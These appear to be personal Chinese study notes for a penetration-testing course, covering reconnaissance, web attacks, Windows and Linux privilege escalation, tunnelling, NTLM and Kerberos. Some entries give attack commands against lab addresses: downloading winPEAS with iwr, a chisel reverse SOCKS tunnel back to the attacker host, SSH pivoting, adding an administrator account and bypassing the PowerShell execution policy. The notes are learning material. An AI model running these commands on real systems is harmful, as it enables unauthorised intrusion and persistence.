



# 6）信息收集





## 被动信息收集







### Security Header  SSL/TLS






## 主动信息收集



### DNS枚举







### 端口扫描









### SMB枚举





### SMTP枚举



### SNMP枚举







# 8）web应用攻击介绍



## web应用评估工具



### 通过使用nmap收集web应用指纹





### 使用gobuster目录爆破





### burpsuit使用



## web应用枚举



### web debuger



### 检查HTTP响应头和sitemap





### 枚举API





## 跨站脚本

### XSS基础


### 利用XSS提权






# 9）web应用攻击

## 目录遍历

### 验证目录遍历漏洞

### 本地文件包含LFI






### php wrapper


### 远程文件包含


## 文件上传

### 使用可执行文件

使用pwsh进入kali中的powershell
ps>

### 使用不可执行文件
可以尝试上传ssh公钥到对应用户目录文件中

## 命令注入

kali中可以使用powercat上传到windows目标机上进行revershell


# 10）sql注入攻击

## sql概念和理论

### sql数据库种类



# 2023/8/5

### 8.2.2 识别网站技术栈



# 2023/8/6

### API渗透


# 2023/8/8

敏感路径（linux/window）
wordpress枚举
pwsh

# 2023/8/9

ssh公钥私钥

# 2023/8/10

powercat

# 2023/8/13


# 2023/8/18

window权限划分，IIS-user用户和everyone

# 2023/8/19


注册表：
win+R    regedit
权限维持，留后门，读取密码，提权获取信息
克隆账号
HKEY_LOCAL_MACHINE键
SAM中可以克隆账号，但是需要管理员账号
SOFTWARE/Microsoft/windows/CurrentVersion/Run 这里键值是开机自启

常用DOS命令：













# 2023/8/21



批处理：
提权，无文件攻击
后缀为.bat

powershell
有时执行是会报错，禁止运行脚本（解决方式：cmd下 powershell -exec bypass ./aa.ps1）

内核2.6.32-3.3 比较难使用内核提权
磁盘分区：
/dev/hda5  hd代表IDE设备，sd代表SCSI设备，磁盘顺序a，b，c，最后数字代表分区顺序（前5个划分给主分区）
df -T 看到分区挂载 df -Th
umount /dev/sr0  卸载挂载
mount /dev/sr0 /media  挂载分区

NTFS 单个文件不能超过2T，window使用
FAT32 单个文件不能超过4G
exfat 可以支持windows和linux，macOS

linux引导项修改密码


# 2023/8/26

VBA脚本
docx后缀无法存储宏代码，只有docm或者老式doc文档中

# 2023/8/29

window library文件
packet storm网站
buffer overflow


*********************************

# 2023/8/30





* 15.2.3







304 not modified
敏感路径linux和windows




# 2023/9/6



一个预先计算好的密码列表或表被称为彩虹表，相应的攻击被称为彩虹表攻击。






# 2023/9/7





# 2023/9/8

使用docker快速部署，架设渗透系统
使用脚本快速部署docker环境

需求：
* 含有web控制页面（python页面），在web上可以执行命令
* 模块化
* 体积小，利于网络传输
* 含有工程开发环境
* 含有热门渗透工具






# 2023/9/9



Enter-PSSession 与单个主机启动交互，所有输入会在远程主机执行
Enter-PSSession -ComputerName 主机名 -Credential PSCredential实体

创建PSCredential
PSCredential 对象表示一组安全凭据，例如用户名和密码。 此对象可以作为参数传递给函数，以便该函数以此凭据对象中的用户帐户身份运行
$password = ConvertTo-SecureString "MyPlainTextPassword" -AsPlainText -Force
创建安全字符串

$Cred = New-Object System.Management.Automation.PSCredential ("username", $password)
创建安全字符串后，需要将其传递到 PSCredential() 方法，以创建凭据对象。


* 16.1.5
使用自动提权枚举工具
powershell中使用iwr来远程下载枚举工具
```powershell
iwr -uri http://192.168.2.200/winPEASx64.exe -Outfile winPEAS.exe
```

evil-winrm在window中跳出restrick shell









* 16.3.1
windows自动任务
收集目标
1）这个自动任务的运行上下文是哪个用户，权限是否比现在使用的用户权限高
2）如何触发自动任务，如果过去满足了触发条件，那么任务将不会在将来再次运行
3）自动任务干了些什么

Get-ScheduledTask 获取自动任务列表
schtasks /query 获取自动任务列表
一般会有信息洪水
schtasks /query /fo LIST /v 显示名字，上下文用户，执行时间



# 2023/9/10

* 17.1.1

linux提权
1）查看当前用户信息 id

2）查看所有用户信息 cat /etc/passwd

3）hostname 通常情况下，主机名将包含可识别的缩写，例如web表示web服务器，db表示数据库服务器，dc表示域控制器

4）OS type

5）进程 ps aux

6）网络，网络网卡，路由，开放端口
routel  route
netstat ss

7）防火墙iptable

8）自动任务
ls -lah /etc/cron*

crontab -l

9）安装的软件dpkg rmp。。。正如我们前面提到的，访问限制不足的文件可能会产生漏洞，从而可能授予攻击者更高的权限。

10）在大多数系统上，在引导时自动挂载驱动器。因此，很容易忘记卸载的驱动器可能包含有价值的信息。
mount
cat /etc/fstab
lsblk

11）kernel
lsmod
modinfo


12）suid sgid

# 2023/9/12

* 17.2.1
.bashrc中可能含有账号密码
crunch wordlist工具生成wordlist使用hydra爆破账号密码
```bash
crunch 6 6 -t Lab%%% > wordlist

Lab000
Lab001
```
我们将最小和最大长度设置为6个字符，使用-t参数指定模式，然后将前三个字符硬编码为Lab，后跟三个数字。


* 17.2.2
daemons
使用watch命令查看ps内容（不断更新）
```bash
watch -n 1 "ps -aux | grep pass"
```
-n 1 表示每一秒执行后面语句，更新面板

另一个提权角度是进行抓包tcpdump，查看网络流量中是否含有用户凭据


* 17.3.1
自动任务cron
```bash
grep "CRON" /var/log/syslog
```
查看有关自动任务的执行日志



* 17.4.1
linux的capability提权

* 17.4.2
AppArmor
aa-status


# 2023/9/13

* 18.1
端口重定向与隧道区别：
端口重定向意味着修改数据流，使发送到一个套接字的数据包被接收并传递到另一个套接字。隧道意味着将一种类型的数据流封装在另一种类型的数据流中，例如，在一个安全外壳(SSH)连接中传输超文本传输协议(HTTP)流量(因此从外部的角度来看，只有SSH流量是可见的)。

* 18.2.2
confluence

* 18.2.3
socat 进行端口转发
ps aux | grep socat
kill -9 3306

# 2023/9/15

* 18.3.1
使用ssh进行本地端口转发
kali-->confluence01-->PGDatabase01-->HRSHARE
ssh -N -L 0.0.0.0:4455:HRSHAREip:445 database_admin@PGDatabase01ip

* 18.3.2
ssh本地动态端口转发
ssh -N -D 0.0.0.0:9999 database_admin@PGDatabase01ip
proxychain设置

* 18.3.3
ssh远程端口转发

* 18.3.4

# 2023/9/24

* 19.1.1
http隧道建立
使用chisel内网穿透工具
条件：
目标被防火墙隔离，只开放一个端口或者值允许HTTP流量通过，此时一般反弹shell不会起作用

* 19.1.2
Chisel工具跨平台，体积小，上传方便（只上传一个本体exe文件）

sudo cp $(which chisel) /var/www/html/

kali~$ chisel server --port 8080 --reverse

target~$ /tmp/chisel client 192.168.2.28:8080 R:socks > /dev/null 2>&1 &
R： 创建reverse 隧道
> /dev/null 2>&1 & 将命令强制后台执行

ss -ntplu 

ssh -o
ncat工具


* 19.2.1
DNS隧道
DNS原理
三种DNS记录种类

* 19.2.2
dnscat2工具
一般使用DNS隧道会很慢，应为dnscat2客户端和服务端确认4次


# 2023/10/4

windows10/7 开启smb服务
在“控制面板”中，选择“程序和功能”。
在“控制面板主页”下，选择“打开或关闭 Windows 功能”打开“Windows 功能”框。
在“Windows 功能”框中，向下滚动列表，清除“SMB 1.0/CIFS 文件共享支持”对应的复选框，然后选择“确定”。
在 Windows 应用更改后，在确认页上选择“立即重启”。


查看smb协议状态
Get-SmbServerConfiguration
启用Smbv1协议
Get-SmbServerConfuguration -EnableSMB1Protocol $true
关闭Smbv1协议
Get-SmbServerConfuguration -EnableSMB1Protocol $false

net use \\192.168.2.10\share   远程连接共享目录（输入账号密码）
net use \\192.168.2.10\share /delete   关闭共享连接

# 2023/10/5

NTLM概念：
SSPI：安全服务接口，规定了一些类安全验证等服务接口，但是没有实现
SSP：安全服务提供者，实现了SSPI对应的安全服务等功能，例如NTLM SSP ，或者Kerberos SSP等

NTLM加密方式：
密码明文--->（转为16进制）--->（使用unicode编码）--->（标准MD4加密）---> 密文

登录计算机进程winlogon.exe输入用户密码，将密码传输给lsass.exe进程，此进程会将密码进行加密变成NTML hash与SAM比较

NTLM认证：
认证分为三步，一 协商，二 质询，三 认证

前四个包，使客户端与服务端连接，并且协商使用SMB协议

协商negotiate：
第五个包，客户端发送 NTLMSSP_NEGOTIATE 包到服务器（启用NTLM身份验证功能，以及与服务器协商）

质询challenge：
第六个包，当服务器端收到 NTLMSSP_NEGOTIATE 包时，确认客户端协商的内容，返回 Challenge 包 NTLMSSP_CHALLENGE（服务器支持的协商内容，以及一个16B长度的随机字符串，NTLM server challenge）

认证auth：
第七个包，收到服务器的challenge包后，使用它加密身份信息，以及session key发送给服务器（包含NTLM v2，NTProofStr保证数据完整，session key协商密钥等信息）
auth包重要信息：
（NTLM v2 hash） 收到challenge值后使用它加密账号密码NTLM
* 用户名--->（大写）--->（+域名）--->（转化为16进制）--->（unicode编码）--->（+NTLM）--->（MD5加密）---> NTLM v2 hash
（session key） session key协商后续数据传输加密与解密
* LM hash + NTLM hash + password + challenge等等 -----> KeyExchangeKey
* KeyExchangeKey + exportedSessionKey（由客户端生成的随机数） ------> session key

pass the hash：
net-NTLM v2 hash（NTLM respone）是由用户NTLM密码加密，如果无法揭密出用户NTLM值对应的密码，可以自己生成NTLM v2 hash作为认证回复，获得该用户权限

net-NTLM hash relay：
中间人攻击中，在认证第三步AUTH，其中包含net NTLM hash，截取hash进行重放攻击

session key协商：
客户端使用KeyExchangeKey作为key使用RC4加密exported key，生成session key发送到服务端，服务端收到后使用用户密码和challenge等值运算得到KeyExchangeKey，然后使用KeyExchangeKey与session key一起运算得到exported key用于后续流量加密

# 2023/10/12

域基础知识：
名称（DC，OU，CN，DN，RND，UPN）
DC：域组件，例如 DC=test,DC=com   代表test.com
OU：单位组织
CN：通用名称，例如 CN=AD,CN=Name ,一般为对象名称
DN：可辩别名称，每一个对象都含有一个独一无二的名称，例如：CN=AD,OU=Damain Controlers,DC=test,DC=com
RDN：相对辩别名称，例如上面的DN的RDN为CN=AD
UPN：用户主体名称，例如test.com中的abc用户的UPN为，abc@test.com

域内资源访问（kerberos认证）
AS-REQ 和 AS-REP

域信任：
双向信任（当一个子域加入域林时，会自动双向信任它的上一级父域）

net user abc password /add   添加用户
net localgroup administrators abc /add  将abc加入到管理员组
smbclient -L 192.168.2.100 -U username%password   显示共享目录列表
smbclient \\192.168.2.100\share -U username%password  连接到共享目录，会有smb> 标识

# 2023/10/13

AS-REQ（第一个包 客户端到KDC）：
cname字段：请求的用户，请求成功域请求失败是不同的，可以用于枚举域内用户
realm字段：域名
sname字段：请求的服务
PA-DATA pA-ENC-TIMESTAMP字段：预认证，这一部分为加密（使用用户ntlm hash或者用户密码AES key加密）

AS-REP（第二个包 KDC返回客户端）：
当KDC收到请求，会从活动目录数据库中取出该用户的hash，对PA-DATA pA-ENC-TIMESTAMP字段解密，如果成功后发送AS-REP包到客户端
ticket字段：认购票据，包括TGT和logon session
enc-part字段：内层enc-part字段为加密的TGT票据，使用KDC中krbtgt用户hash加密。外层为加密的logon session key，使用该用户自己的hash加密
authorization-data字段：包含PAC信息，当KDC收到客户端请求后，取到AS-REQ中的cname字段，在本地活动目录中查找samAccountName中包含该cname的用户，使用该用户权限生成PAC

# 2023/10/14

TGS-REQ（第三个包，客户端请求KDC）：
客户端当从AS-REP中解密出TGT和logon session key，并且缓存他们


# 2023/10/29

* linux系统
ssh日志文件
ubuntu：/var/log/auth.log
centos：/var/log/secure

日志
用户凭据

应用服务配置提权




wordpress枚举

# local public exploit

注意下载的exploit，加密的hex包含对于计算机有害的后门
平台：
exploit-db
packet storm
github

# buffer overflow

寻找注入点（或者远程入口点）
模糊测试fuzzing 确定多少字符奔溃
确定确切的偏移量offset





